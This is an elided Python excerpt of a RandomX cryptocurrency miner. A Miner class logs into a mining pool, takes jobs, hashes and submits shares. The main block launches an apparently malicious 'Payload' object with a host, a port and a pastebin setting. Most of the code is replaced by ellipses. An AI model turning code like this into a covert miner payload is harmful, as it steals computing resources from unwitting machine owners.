...
class Miner(multiprocessing.Process):
    ...
    def __init__(self, url, port, user):
        ...
        self.pool_port = port
        import random
        self.pool_pass = 'x{}'.format(random.randint(1,2444))
        self.user = user
    ...
    def run(self):
        ...
        login = {
            ...
            'params': {
                ...
                'pass': self.pool_pass,
                'rigid': '',
                'agent': 'tests-{}'.format(random.randint(1,100))
            },
            'id':1#random.randint(1,100)
        }
        log("Login: login- {} | id- {}".format(login['params']['agent'],login['id']) )
        log('Logging into pool: {}:{}'.format(self.pool_host, self.pool_port))
        ...
        try:
            while 1:
                ...
                log('result: {}'.format(str(result)))
                log('method: {}'.format(str(method)))
                log('params: {}'.format(str(params)))
                if error:
                    log('ERROR,skipping')
                    continue
                if result and result.get('status'):
                    log('Status: {}'.format(result.get('status')))
                if result and result.get('job'):
                    log('JOB: ',str(result.get('job')))
    ...
    def worker(self):
        ...
        while 1:
            ...
            if cnv > 5:
                ...
                log('New job with target: {}, RandomX, height: {}'.format(target, height))
            #else:
            ...
            while 1:
                ...
                if r64 < target:
                    ...
                    log('{}Hashrate: {} H/s'.format(os.linesep, hr))
                    submit = {
                        'method':'submit',
                        'params': {
                            'id': login_id,
                    ...
                    log('Submitting hash: {}'.format(hex_hash))
...
if __name__ == '__main__':
    _payload = Payload(host='192.168.0.192', port='1222', pastebin='')
    _payload.run()